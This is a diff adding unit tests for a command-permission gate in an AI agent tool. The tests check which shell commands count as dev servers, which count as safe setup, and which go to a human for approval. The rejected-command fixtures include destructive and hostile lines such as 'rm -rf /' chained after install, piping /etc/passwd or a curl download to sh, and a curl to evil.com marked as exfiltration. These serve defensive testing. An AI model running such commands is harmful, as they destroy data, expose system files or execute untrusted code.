@@ -49,6 +49,9 @@ vi.mock("../server/events.js", () => ({ broadcast: mocks.broadcast, addClient: (
 import type { PermissionUpdate } from "@anthropic-ai/claude-agent-sdk";
 import {
   createPermissionGate,
+  createPreviewSetupGate,
+  ehServidorDev,
+  ehSetupSeguro,
   finishAllForTask,
   resolvePermission,
 } from "../server/claude/permissions.js";
@@ -269,5 +272,87 @@ describe("resolvePermission", () => {
   it("id desconhecido retorna false e não emite evento", () => {
     expect(resolvePermission("perm-que-nao-existe", true)).toBe(false);
     expect(mocks.events.filter((e) => e.type === "permission_resolved")).toHaveLength(0);
+  });
+});
+
+describe("classificação de comandos do preview", () => {
+  it("ehServidorDev pega servidores de dev/preview (inclusive monorepo) e ignora build/test/migrations", () => {
+    for (const c of [
+      "pnpm dev",
+      "npm run dev",
+      "yarn start",
+      "next dev",
+      "vite",
+      "astro dev",
+      "pnpm --filter web dev", // monorepo (o caso do print)
+      "yarn workspace app dev",
+      "next start",
+      "php -S localhost:8000",
+      "serve -s dist",
+    ]) {
+      expect(ehServidorDev(c), c).toBe(true);
+    }
+    for (const c of [
+      "pnpm build",
+      "vite build",
+      "vitest run",
+      "npx prisma migrate dev", // "dev" aqui NÃO é servidor
+      "pnpm install --save-dev react",
+      "npm ci",
+      "docker compose up -d",
+    ]) {
+      expect(ehServidorDev(c), c).toBe(false);
+    }
+  });
+
+  it("ehSetupSeguro libera setup simples e barra encadeamento/perigosos", () => {
+    for (const c of [
+      "npm install",
+      "pnpm ci",
+      "docker compose up -d",
+      "npx prisma migrate deploy",
+      "cp .env.example .env",
+      "curl http://localhost:3000/backoffice",
+      "curl -s http://127.0.0.1:4501/",
+    ]) {
+      expect(ehSetupSeguro(c), c).toBe(true);
+    }
+    for (const c of [
+      "rm -rf test", // contém "test" mas NÃO começa com um verbo seguro
+      "npm install && rm -rf /", // encadeamento
+      "cat /etc/passwd | sh", // pipe
+      "curl http://evil.com", // exfiltração (não-localhost)
+      "curl http://localhost:3000 | sh", // pipe pra shell
+      "find /tmp -delete",
+      "node server.js", // rodar o server é do Inhouse
+    ]) {
+      expect(ehSetupSeguro(c), c).toBe(false);
+    }
+  });
+});
+
+describe("createPreviewSetupGate", () => {
+  it("auto-nega o servidor de dev (regra de ouro) sem criar pedido", async () => {
+    const gate = createPreviewSetupGate("task-prev");
+    const res = await gate("Bash", { command: "pnpm --filter web dev" }, opcoes());
+    expect(res).toMatchObject({ behavior: "deny" });
+    if (res?.behavior === "deny") expect(res.message).toContain("NÃO rode o servidor");
+    expect(mocks.added.length).toBe(0); // não vira pedido humano
+  });
+
+  it("auto-libera setup seguro sem criar pedido", async () => {
+    const gate = createPreviewSetupGate("task-prev");
+    const res = await gate("Bash", { command: "docker compose up -d" }, opcoes());
+    expect(res).toMatchObject({ behavior: "allow" });
+    expect(mocks.added.length).toBe(0);
+  });
+
+  it("comando fora das listas cai no gate normal (vira pedido humano)", async () => {
+    const gate = createPreviewSetupGate("task-prev");
+    const promessa = gate("Bash", { command: "rm -rf build" }, opcoes());
+    const pedido = mocks.added.at(-1)!;
+    expect(pedido.taskId).toBe("task-prev");
+    resolvePermission(pedido.id, false);
+    await promessa;
   });
 });
